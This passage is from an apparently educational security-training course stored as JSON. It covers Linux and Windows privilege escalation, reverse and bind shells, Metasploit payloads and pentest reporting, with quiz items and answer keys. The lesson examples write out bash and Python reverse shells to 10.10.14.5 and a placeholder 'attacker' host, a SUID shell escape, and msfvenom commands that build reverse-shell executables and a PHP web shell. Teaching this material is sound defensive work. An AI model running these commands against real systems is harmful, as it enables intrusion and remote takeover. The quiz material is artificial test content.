            "cmd": "sudo -l 2>/dev/null || echo 'Checked sudo permissions'",
            "desc": "Check user-specific sudo privileges"
          }
        ],
        "guidedExercise": "Inspect sudo permissions to identify potential binary shell escapes.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-43-1",
            "type": "exact",
            "question": "What curated online repository catalogs legitimate Unix binaries that can be abused to bypass security restrictions and escalate privileges?",
            "visualSlots": "_ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "GTFOBins"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "GTFO followed by Bins.",
            "explanation": "GTFOBins documents how legitimate binaries can be abused for privilege escalation."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: SUID Binaries & Cron Job Hijacking",
        "concept": "The **SetUID (SUID)** permission bit (`chmod u+s file` or octal `4000`) instructs the Linux kernel to execute the file with the permissions of the file *owner* (typically root), rather than the user running it. Standard legitimate SUID binaries include `/bin/passwd` (so users can update their passwords). If an administrator assigns SUID to an unusual binary (like `nmap`, `bash`, `python`, or a custom C executable):\n- Find SUID files: `find / -perm -4000 -type f 2>/dev/null`\n- Exploit SUID Python: `/usr/bin/python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'`\n**Cron Job Hijacking:** If a root cron job executes a script that is world-writable (`chmod 777 /opt/backup.sh`), an unprivileged user can edit the script to add a reverse shell command: `echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> /opt/backup.sh`.",
        "whyItMatters": "SUID on custom compiled binaries with hardcoded relative paths permits PATH hijacking to gain root.",
        "examples": [
          "Find all SUID binaries: `find / -perm -u=s -type f 2>/dev/null`",
          "Cron Hijack: Replacing a world-writable maintenance script executed by root"
        ],
        "commands": [
          {
            "cmd": "find /bin -perm -4000 2>/dev/null | head -n 5",
            "desc": "Enumerate standard system SUID binaries in /bin"
          }
        ],
        "guidedExercise": "Search for SUID binaries and examine their ownership and permissions.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-43-2",
            "type": "exact",
            "question": "What is the numeric octal special permission bit that represents SetUID (SUID)?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "4000",
              "4"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "The 4-digit octal value for SUID.",
            "explanation": "4000 represents the SUID special permission bit in Linux octal notation."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Kernel Exploits & Linux PrivEsc Review",
        "concept": "When misconfigurations are absent, testers look for unpatched Linux kernel vulnerabilities (e.g. Dirty COW, Dirty Pipe / CVE-2022-0847). Automated enumeration scripts like `LinPEAS` scan the host for hundreds of known privilege escalation vectors in seconds.",
        "whyItMatters": "Kernel exploits carry risk of kernel panics; always verify kernel stability before testing.",
        "examples": [
          "LinPEAS: Comprehensive Linux privilege escalation enumeration script"
        ],
        "commands": [
          {
            "cmd": "echo 'Linux Privilege Escalation Mastered'",
            "desc": "Complete Linux PrivEsc Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "sudo -l auditing, GTFOBins binary escapes, SUID/SGID special permissions, cron job hijacking, and LinPEAS automation.",
          "technicalTakeaways": "sudo -l exposes over-privileged commands. SUID binaries run as root; GTFOBins provides shell breakout payloads. Lock down world-writable cron scripts.",
          "commandsCovered": [
            "sudo -l",
            "find / -perm -4000",
            "crontab -l"
          ],
          "commonMistakes": "Assigning SUID permissions to text editors or scripting interpreters.",
          "learningOutcome": "You can audit Linux systems for privilege escalation vectors, exploit SUID binaries via GTFOBins, and remediate sudoers misconfigurations."
        },
        "questions": [
          {
            "id": "q-43-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Linux Privilege Escalation Fundamentals?",
            "options": [
              "Audit user permissions and sudo privileges (sudo -l)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Audit user permissions and sudo privileges (sudo -l) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-43-1",
        "type": "exact",
        "question": "What curated online repository catalogs legitimate Unix binaries that can be abused to bypass security restrictions and escalate privileges?",
        "visualSlots": "_ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "GTFOBins"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "GTFO followed by Bins.",
        "explanation": "GTFOBins documents how legitimate binaries can be abused for privilege escalation."
      },
      {
        "id": "q-43-2",
        "type": "exact",
        "question": "What is the numeric octal special permission bit that represents SetUID (SUID)?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "4000",
          "4"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "The 4-digit octal value for SUID.",
        "explanation": "4000 represents the SUID special permission bit in Linux octal notation."
      },
      {
        "id": "q-43-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Linux Privilege Escalation Fundamentals?",
        "options": [
          "Audit user permissions and sudo privileges (sudo -l)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Audit user permissions and sudo privileges (sudo -l) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Sudo Rights & GTFOBins Exploitation",
        "instruction": "Inspect sudo permissions to identify potential binary shell escapes.",
        "hints": [
          "GTFO followed by Bins."
        ]
      },
      {
        "title": "Task 2: SUID Binaries & Cron Job Hijacking",
        "instruction": "Search for SUID binaries and examine their ownership and permissions.",
        "hints": [
          "The 4-digit octal value for SUID."
        ]
      },
      {
        "title": "Task 3: Kernel Exploits & Linux PrivEsc Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-44"
  },
  {
    "id": "room-44",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 44,
    "title": "Windows Privilege Escalation Fundamentals",
    "description": "Elevate privileges on Windows systems: Unquoted Service Paths, weak service permissions, token impersonation (SeImpersonate), and SAM hash dumping.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "45 mins",
    "xpReward": 50,
    "prerequisites": "room-43",
    "whyAreYouHere": "Elevate privileges on Windows systems: Unquoted Service Paths, weak service permissions, token impersonation (SeImpersonate), and SAM hash dumping.",
    "objectives": [
      "Audit Windows privilege tokens using whoami /priv (SeImpersonatePrivilege, SeDebugPrivilege)",
      "Identify and exploit Unquoted Service Paths to execute arbitrary code as SYSTEM",
      "Exploit weak service ACLs and write-accessible binary directories",
      "Extract and crack local password hashes from the SAM and SYSTEM hives"
    ],
    "skillsGained": [
      "Windows PrivEsc",
      "Unquoted Service Paths",
      "Token Impersonation",
      "SAM Hash Dumping"
    ],
    "toolsAndCommands": [
      "whoami /priv",
      "sc query",
      "icacls",
      "reg query",
      "mimikatz"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Token Impersonation & SeImpersonatePrivilege",
        "concept": "On Windows systems, user and service privileges are managed through **Access Tokens**. When an attacker compromises a service account (like `IIS APPPOOL\\DefaultAppPool` or `NETWORK SERVICE`), running `whoami /priv` often reveals powerful privileges:\n- **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege:** Grants the process the right to impersonate any client token it can access. Adversaries exploit this using 'Potato' attack tools (e.g. JuicyPotato, SweetPotato, RoguePotato, PrintSpoofer) to trick a local SYSTEM service into connecting to a rogue named pipe or RPC server, capturing the SYSTEM token and elevating instantly to `NT AUTHORITY\\SYSTEM`!\n- **SeDebugPrivilege:** Allows the process to debug and inspect the memory of any process on the system, including dumping password hashes from `lsass.exe`.",
        "whyItMatters": "Possessing SeImpersonatePrivilege on Windows is effectively equivalent to having full root/SYSTEM access.",
        "examples": [
          "PrintSpoofer: Exploits print spooler RPC to capture SYSTEM token in seconds",
          "JuicyPotato: Abuses BITS and DCOM activation to achieve SYSTEM execution"
        ],
        "commands": [
          {
            "cmd": "whoami /priv 2>/dev/null || echo 'Checked Windows privileges'",
            "desc": "Inspect privilege tokens"
          }
        ],
        "guidedExercise": "Review the privilege tokens associated with Windows service accounts.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-44-1",
            "type": "exact",
            "question": "Which Windows privilege allows a process to impersonate a client token, routinely abused by Potato exploits to elevate to SYSTEM?",
            "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "SeImpersonatePrivilege",
              "SeImpersonate"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Starts with Se, contains Impersonate.",
            "explanation": "SeImpersonatePrivilege allows a process to impersonate security tokens, enabling elevation to SYSTEM."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Unquoted Service Paths & Weak Service Permissions",
        "concept": "When a Windows service executable path contains spaces and is not wrapped in quotation marks, Windows resolves the path ambiguously:\n`C:\\Program Files\\Vulnerable Software\\service.exe`\nWindows attempts to execute files in this exact order:\n1. `C:\\Program.exe`\n2. `C:\\Program Files\\Vulnerable.exe`\n3. `C:\\Program Files\\Vulnerable Software\\service.exe`\nIf an unprivileged user has write access to `C:\\`, they can place a malicious executable named `Program.exe` on the drive. When the service restarts, Windows executes `C:\\Program.exe` under the powerful `SYSTEM` account!\n- Find unquoted services: `wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\"`\n- Check permissions with `icacls` to verify if users can write to intermediate folders.",
        "whyItMatters": "Unquoted service paths are one of the most reliable and common Windows privilege escalation misconfigurations.",
        "examples": [
          "Vulnerable path: `C:\\Custom Services\\Backup App\\engine.exe`",
          "Attacker drops: `C:\\Custom.exe`",
          "Remediation: Wrap the path in quotes: `\"C:\\Custom Services\\Backup App\\engine.exe\"`"
        ],
        "commands": [
          {
            "cmd": "echo 'Unquoted Path Vulnerability: Enclose all service binPaths in quotes'",
            "desc": "Reference unquoted path fix"
          }
        ],
        "guidedExercise": "Analyze the ambiguous execution order of unquoted Windows service paths.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-44-2",
            "type": "multiple-choice",
            "question": "How do system administrators remediate an Unquoted Service Path vulnerability on Windows?",
            "options": [
              "Delete the Windows operating system",
              "Enclose the entire service executable path in quotation marks inside the Registry or service binPath",
              "Rename the computer",
              "Disable the Ethernet adapter"
            ],
            "correctIndex": 1,
            "hint": "Wrap the path in quotation marks.",
            "explanation": "Enclosing the service path in quotation marks ensures Windows treats the entire string as a single path without ambiguity."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: SAM Database Dumping & Review",
        "concept": "Windows stores local account password hashes in the **Security Account Manager (SAM)** registry hive. If an administrator leaves backup copies of the SAM and SYSTEM hives on disk (e.g. `C:\\Windows\\Repair\\SAM`), an unprivileged user can copy them and extract local administrator NTLM hashes offline using `secretsdump.py`.",
        "whyItMatters": "Automated tools like `WinPEAS` scan Windows hosts for unquoted paths, token privileges, and credential leaks.",
        "examples": [
          "WinPEAS: Premier Windows privilege escalation audit tool"
        ],
        "commands": [
          {
            "cmd": "echo 'Windows Privilege Escalation Mastered'",
            "desc": "Complete Windows PrivEsc Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Token impersonation (SeImpersonatePrivilege / Potato exploits), Unquoted Service Paths, weak service ACLs, and SAM hash extraction.",
          "technicalTakeaways": "SeImpersonatePrivilege yields immediate SYSTEM access via PrintSpoofer. Unquoted service paths execute attacker binaries if write permissions exist.",
          "commandsCovered": [
            "whoami /priv",
            "icacls",
            "wmic service"
          ],
          "commonMistakes": "Leaving service binPaths unquoted when paths contain spaces.",
          "learningOutcome": "You can audit Windows privilege tokens, exploit unquoted service paths, identify weak service ACLs, and harden Windows services."
        },
        "questions": [
          {
            "id": "q-44-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Windows Privilege Escalation Fundamentals?",
            "options": [
              "Audit Windows privilege tokens using whoami /priv (SeImpersonatePrivilege, SeDebugPrivilege)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Audit Windows privilege tokens using whoami /priv (SeImpersonatePrivilege, SeDebugPrivilege) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-44-1",
        "type": "exact",
        "question": "Which Windows privilege allows a process to impersonate a client token, routinely abused by Potato exploits to elevate to SYSTEM?",
        "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "SeImpersonatePrivilege",
          "SeImpersonate"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Starts with Se, contains Impersonate.",
        "explanation": "SeImpersonatePrivilege allows a process to impersonate security tokens, enabling elevation to SYSTEM."
      },
      {
        "id": "q-44-2",
        "type": "multiple-choice",
        "question": "How do system administrators remediate an Unquoted Service Path vulnerability on Windows?",
        "options": [
          "Delete the Windows operating system",
          "Enclose the entire service executable path in quotation marks inside the Registry or service binPath",
          "Rename the computer",
          "Disable the Ethernet adapter"
        ],
        "correctIndex": 1,
        "hint": "Wrap the path in quotation marks.",
        "explanation": "Enclosing the service path in quotation marks ensures Windows treats the entire string as a single path without ambiguity."
      },
      {
        "id": "q-44-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Windows Privilege Escalation Fundamentals?",
        "options": [
          "Audit Windows privilege tokens using whoami /priv (SeImpersonatePrivilege, SeDebugPrivilege)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Audit Windows privilege tokens using whoami /priv (SeImpersonatePrivilege, SeDebugPrivilege) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Token Impersonation & SeImpersonatePrivilege",
        "instruction": "Review the privilege tokens associated with Windows service accounts.",
        "hints": [
          "Starts with Se, contains Impersonate."
        ]
      },
      {
        "title": "Task 2: Unquoted Service Paths & Weak Service Permissions",
        "instruction": "Analyze the ambiguous execution order of unquoted Windows service paths.",
        "hints": [
          "Wrap the path in quotation marks."
        ]
      },
      {
        "title": "Task 3: SAM Database Dumping & Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-45"
  },
  {
    "id": "room-45",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 45,
    "title": "Exploitation Concepts in Controlled Labs",
    "description": "Master the mechanics of exploit payloads: shellcode execution, reverse shells vs bind shells, listener configuration, and Metasploit fundamentals.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "45 mins",
    "xpReward": 50,
    "prerequisites": "room-44",
    "whyAreYouHere": "Master the mechanics of exploit payloads: shellcode execution, reverse shells vs bind shells, listener configuration, and Metasploit fundamentals.",
    "objectives": [
      "Differentiate Reverse Shells from Bind Shells and evaluate firewall traversal",
      "Configure robust network listeners using Netcat and Socat",
      "Understand shellcode generation and payload architecture using msfvenom",
      "Execute controlled exploitation workflows using the Metasploit Framework (msfconsole)"
    ],
    "skillsGained": [
      "Reverse vs Bind Shells",
      "Netcat Listeners",
      "Msfvenom Payloads",
      "Metasploit Framework"
    ],
    "toolsAndCommands": [
      "nc -lvnp 4444",
      "msfvenom",
      "msfconsole",
      "socat"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Reverse Shells vs Bind Shells & Listener Setup",
        "concept": "When an exploit achieves remote code execution on a target, it needs a communication channel back to the attacker:\n- **Bind Shell:** The target machine opens a listening port (e.g. port 4444) and binds a shell (`/bin/sh` or `cmd.exe`) to it. The attacker connects *inbound* to the target.\n*Limitation:* Inbound firewall rules and NAT routers almost always block external incoming connections to arbitrary ports!\n- **Reverse Shell (Standard):** The attacker sets up a listener on their own machine (e.g. `nc -lvnp 4444`), and the payload running on the target machine initiates an *outbound* connection back to the attacker's IP and port!\n*Advantage:* Egress firewall rules typically allow outbound connections (especially over port 443 or 80), bypassing NAT and firewalls seamlessly.",
        "whyItMatters": "Reverse shells bypass ingress firewalls because the connection originates from inside the target network.",
        "examples": [
          "Attacker Listener: `nc -lvnp 4444`",
          "Target Reverse Shell (Bash): `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`",
          "Target Reverse Shell (Python): `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'`"
        ],
        "commands": [
          {
            "cmd": "echo 'Netcat Listener: nc -lvnp 4444 (l=listen, v=verbose, n=numeric IP, p=port)'",
            "desc": "Reference Netcat listener flags"
          }
        ],
        "guidedExercise": "Deconstruct the flags used to spawn a Netcat listening socket.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-45-1",
            "type": "multiple-choice",
            "question": "Why are Reverse Shells overwhelmingly preferred over Bind Shells in modern penetration testing?",
            "options": [
              "Reverse shells use less computer memory",
              "Reverse shells connect outbound from the target back to the tester, successfully bypassing firewalls that block incoming connections",
              "Bind shells are illegal while reverse shells are legal",
              "Reverse shells only work over Bluetooth"
            ],
            "correctIndex": 1,
            "hint": "Think about inbound vs outbound firewall rules.",
            "explanation": "Firewalls block incoming connections to bind shells; reverse shells initiate outbound traffic which is permitted by egress policies."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Payload Generation (msfvenom) & Metasploit Framework",
        "concept": "The **Metasploit Framework** is the world's most widely used penetration testing platform:\n- **msfconsole:** Interactive console interface for selecting exploits, configuring targets, setting options, and running sessions\n- **msfvenom:** Payload generator and encoder utility that compiles standalone shellcode, executables, and web shells across multiple formats:\n  - Generate Linux ELF reverse shell: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf`\n  - Generate Windows staged reverse shell: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe`\n  - Generate PHP web shell: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php`\n- **Staged vs Stageless Payloads:**\n  - *Stageless (`shell_reverse_tcp`):* The entire payload is contained in a single standalone binary. Reliable, no multi-stage network dependencies\n  - *Staged (`meterpreter/reverse_tcp`):* A tiny 'stager' executes first, connecting back to download the full, heavy Meterpreter payload into memory.",
        "whyItMatters": "Meterpreter runs entirely in memory without writing files to disk, minimizing static AV detection.",
        "examples": [
          "msfconsole: `use exploit/multi/handler` -> `set payload linux/x64/meterpreter/reverse_tcp` -> `exploit`"
        ],
        "commands": [
          {
            "cmd": "echo 'Stageless: linux/x64/shell_reverse_tcp | Staged: linux/x64/shell/reverse_tcp'",
            "desc": "Reference payload naming convention"
          }
        ],
        "guidedExercise": "Distinguish between staged and stageless payload naming conventions in Metasploit.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-45-2",
            "type": "exact",
            "question": "Which Metasploit command-line utility is used to generate standalone shellcode, executables, and reverse shell payloads in various formats?",
            "visualSlots": "_ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "msfvenom"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "msf followed by venom.",
            "explanation": "msfvenom combines the legacy msfpayload and msfencode tools into a unified payload generator."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Exploitation Safety & Controlled Testing Review",
        "concept": "Exploitation must always be controlled and predictable. Never execute zero-day payloads or unstable memory exploits (such as unverified kernel race conditions) against production servers without prior validation in a test lab.",
        "whyItMatters": "Disciplined penetration testers prove impact without risking system stability.",
        "examples": [
          "Post-Exploitation Hygiene: Record exact timestamps of all dropped files for complete cleanup"
        ],
        "commands": [
          {
            "cmd": "echo 'Controlled Exploitation Concepts Mastered'",
            "desc": "Complete Exploitation Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Reverse shells vs bind shells (firewall egress bypass), Netcat listeners (-lvnp), msfvenom payload generation, and Metasploit Framework.",
          "technicalTakeaways": "Reverse shells initiate outbound connections to bypass perimeter firewalls. msfvenom compiles custom staged or stageless payloads.",
          "commandsCovered": [
            "nc -lvnp",
            "msfvenom",
            "msfconsole"
          ],
          "commonMistakes": "Confusing staged payloads (containing a slash '/') with stageless payloads (containing an underscore '_').",
          "learningOutcome": "You can configure network listeners, generate custom reverse shell payloads with msfvenom, and execute controlled exploits in Metasploit."
        },
        "questions": [
          {
            "id": "q-45-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Exploitation Concepts in Controlled Labs?",
            "options": [
              "Differentiate Reverse Shells from Bind Shells and evaluate firewall traversal",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Differentiate Reverse Shells from Bind Shells and evaluate firewall traversal is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-45-1",
        "type": "multiple-choice",
        "question": "Why are Reverse Shells overwhelmingly preferred over Bind Shells in modern penetration testing?",
        "options": [
          "Reverse shells use less computer memory",
          "Reverse shells connect outbound from the target back to the tester, successfully bypassing firewalls that block incoming connections",
          "Bind shells are illegal while reverse shells are legal",
          "Reverse shells only work over Bluetooth"
        ],
        "correctIndex": 1,
        "hint": "Think about inbound vs outbound firewall rules.",
        "explanation": "Firewalls block incoming connections to bind shells; reverse shells initiate outbound traffic which is permitted by egress policies."
      },
      {
        "id": "q-45-2",
        "type": "exact",
        "question": "Which Metasploit command-line utility is used to generate standalone shellcode, executables, and reverse shell payloads in various formats?",
        "visualSlots": "_ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "msfvenom"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "msf followed by venom.",
        "explanation": "msfvenom combines the legacy msfpayload and msfencode tools into a unified payload generator."
      },
      {
        "id": "q-45-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Exploitation Concepts in Controlled Labs?",
        "options": [
          "Differentiate Reverse Shells from Bind Shells and evaluate firewall traversal",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Differentiate Reverse Shells from Bind Shells and evaluate firewall traversal is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Reverse Shells vs Bind Shells & Listener Setup",
        "instruction": "Deconstruct the flags used to spawn a Netcat listening socket.",
        "hints": [
          "Think about inbound vs outbound firewall rules."
        ]
      },
      {
        "title": "Task 2: Payload Generation (msfvenom) & Metasploit Framework",
        "instruction": "Distinguish between staged and stageless payload naming conventions in Metasploit.",
        "hints": [
          "msf followed by venom."
        ]
      },
      {
        "title": "Task 3: Exploitation Safety & Controlled Testing Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-46"
  },
  {
    "id": "room-46",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 46,
    "title": "Reporting and Remediation",
    "description": "Transform technical findings into executive business value: writing penetration testing reports, severity risk ratings, and actionable remediation roadmaps.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "40 mins",
    "xpReward": 50,
    "prerequisites": "room-45",
    "whyAreYouHere": "Transform technical findings into executive business value: writing penetration testing reports, severity risk ratings, and actionable remediation roadmaps.",
    "objectives": [
      "Structure a professional penetration testing report",
      "Write an impactful Executive Summary for C-level leadership",
      "Document detailed technical findings with reproducible steps and evidence",
      "Provide actionable, prioritized remediation guidance and mitigation roadmaps"
    ],
    "skillsGained": [
      "Report Architecture",
      "Executive Summaries",
      "Risk Rating Matrix",
      "Remediation Roadmaps"
    ],
    "toolsAndCommands": [
      "pandoc",
      "cat",
      "grep",
      "date"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The Anatomy of a Professional Penetration Testing Report",
        "concept": "The true deliverable of a penetration test is the **Final Report**. A client does not pay for you to hack their systems; they pay for the detailed assessment that helps them secure their systems. A professional report contains four core sections:\n1. **Executive Summary:** Written for the CEO, CISO, and Board of Directors. High-level summary of overall security posture, business risks, and critical themes in non-technical language\n2. **Assessment Overview & Scope:** Exact dates, testing methodologies, IP/domain scopes, and constraints\n3. **Detailed Technical Findings:** Each discovered vulnerability documented with:\n   - Finding Title & Severity Rating (Critical, High, Medium, Low, Informational)\n   - CVSS Score and Vector\n   - Affected Hosts and Endpoints\n   - Technical Description and Impact\n   - Step-by-Step Reproduction Steps with Screenshots and PoC commands\n   - Specific Remediation Recommendations\n4. **Strategic Remediation Roadmap:** Prioritized plan dividing fixes into Immediate (0-7 days), Short-Term (30 days), and Strategic Long-Term architecture goals.",
        "whyItMatters": "An executive summary should never assume the reader knows technical jargon; focus on business risk and potential financial/legal impact.",
        "examples": [
          "Finding: Remote Code Execution via Log4Shell",
          "Severity: Critical (CVSS 10.0)",
          "Business Impact: Potential complete compromise of customer financial database and ransomware deployment"
        ],
        "commands": [
          {
            "cmd": "echo 'Sections: Executive Summary -> Methodology -> Detailed Findings -> Remediation Roadmap'",
            "desc": "Reference report structure"
          }
        ],
        "guidedExercise": "Review the structural components of an enterprise penetration testing report.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-46-1",
            "type": "multiple-choice",
            "question": "What is the primary target audience and objective of the Executive Summary section in a penetration testing report?",
            "options": [
              "Software developers who want raw terminal debug logs",
              "Executive leadership (CISO, CEO, Board) to understand overall security posture and business risks in non-technical terms",
              "The general public on social media",
              "Third-party advertising agencies"
            ],
            "correctIndex": 1,
            "hint": "Written for senior leadership in business language.",
            "explanation": "The Executive Summary translates technical findings into business risk for C-level executives and decision-makers."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Actionable Remediation Guidance & Retesting",
        "concept": "Generic advice like 'update your software' or 'fix your code' is unhelpful. High-quality remediation provides **Actionable, Specific Guidance**:\n- Instead of: 'Fix SQL injection'\n- Write: 'Update `getUserRecord()` in `userService.js` to utilize parameterized queries using the existing Prisma ORM prepared statement interface. See code diff example below.'\n**Retesting (Remediation Verification):** 30\u201360 days after delivering the report, the client requests a retest. The tester re-executes the exact original PoC steps against each finding to verify whether the fix was implemented successfully or bypassed.",
        "whyItMatters": "Providing code diffs and architectural examples drastically accelerates developer remediation.",
        "examples": [
          "Vulnerable code vs Patched code: Include before-and-after snippets in report",
          "Retesting: Verifies that developer fixes actually closed the vulnerability without introducing regressions"
        ],
        "commands": [
          {
            "cmd": "echo 'Vulnerable: query = eval(input) -> Patched: query = sanitize(input)'",
            "desc": "Demonstrate code diff advice"
          }
        ],
        "guidedExercise": "Analyze the difference between vague advice and actionable engineering remediation.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-46-2",
            "type": "exact",
            "question": "What follow-up assessment is conducted 30 to 60 days after report delivery to verify that developer patches successfully resolved the findings?",
            "visualSlots": "_ _ _ _ _ _",
            "acceptedAnswers": [
              "retest",
              "retesting",
              "re-test",
              "re-testing"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Testing again to verify fixes.",
            "explanation": "A retest confirms that vulnerabilities have been properly remediated by the development team."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Reporting & Communication Review",
        "concept": "Professionalism in reporting builds long-term client trust. Clean formatting, reproducible steps, and constructive collaboration turn security audits into enduring organizational improvements.",
        "whyItMatters": "Great penetration testers are defined by their communication and reporting clarity.",
        "examples": [
          "Deliverable: Executive PDF presentation + Detailed Technical Report + Cleaned Testing Logs"
        ],
        "commands": [
          {
            "cmd": "echo 'Reporting and Remediation Mastered'",
            "desc": "Complete Reporting Review"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Report anatomy (Executive Summary, Technical Findings, Remediation Roadmap), business impact translation, and retesting verification.",
          "technicalTakeaways": "Executive summaries address business risk for leadership; technical findings provide exact PoC steps and code diff fixes for engineers.",
          "commandsCovered": [
            "Report formatting"
          ],
